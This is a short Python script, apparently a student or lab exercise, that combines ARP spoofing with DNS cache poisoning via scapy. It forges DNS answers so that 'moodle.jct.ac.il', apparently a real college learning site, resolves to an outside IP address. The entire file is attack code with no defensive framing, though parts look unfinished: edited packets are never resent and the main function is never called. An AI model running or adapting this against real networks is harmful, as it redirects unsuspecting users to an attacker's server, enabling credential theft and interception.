from scapy.all import *
import arpSpoof
import threading
import time

DNS_IP='192.168.43.186'
DELAY=1
FAKE_IP='54.229.142.49'


def generate_response( pkt, fake_ip ):
    #not in use
   ptype='A'

   resp = IP(dst=pkt[IP].src, id=pkt[IP].id)\
      /UDP(dport=pkt[UDP].sport, sport=53)\
      /DNS( id=pkt[DNS].id,
            aa=1, #we are authoritative
            qr=1, #it's a response
            rd=pkt[DNS].rd, # copy recursion-desired
            qdcount=pkt[DNS].qdcount, # copy question-count
            qd=pkt[DNS].qd, # copy question itself
            ancount=1, #we provide a single answer
            an=DNSRR(rrname='moodle.jct.ac.il', type=ptype, ttl=100, rdata=fake_ip )
      )
   return resp

def arpspoofing_adapter():
    arpSpoof.attack_ip(DNS_IP, DELAY)


def edit_response(pck):
    pck[DNS].ancount+=1
    pck[DNS].an.add_payload(rrname='moodle.jct.ac.il', type='A', ttl=100, rdata=FAKE_IP )

def dns_poisoning():
    sniff(prn=edit_response,filter='udp src port 53 and host '+DNS_IP,count=3)



def main():
    #open two threads, one for arpspoofing and another for dns poisoning
    t = threading.Thread(name='arps', target=arpspoofing_adapter)
    s=threading.Thread(name='sniffer', target=dns_poisoning)

    t.start()
    time.sleep(3)
    s.start()

    s.join()


#    sniff(prn=send_response,filter=is_dns_query)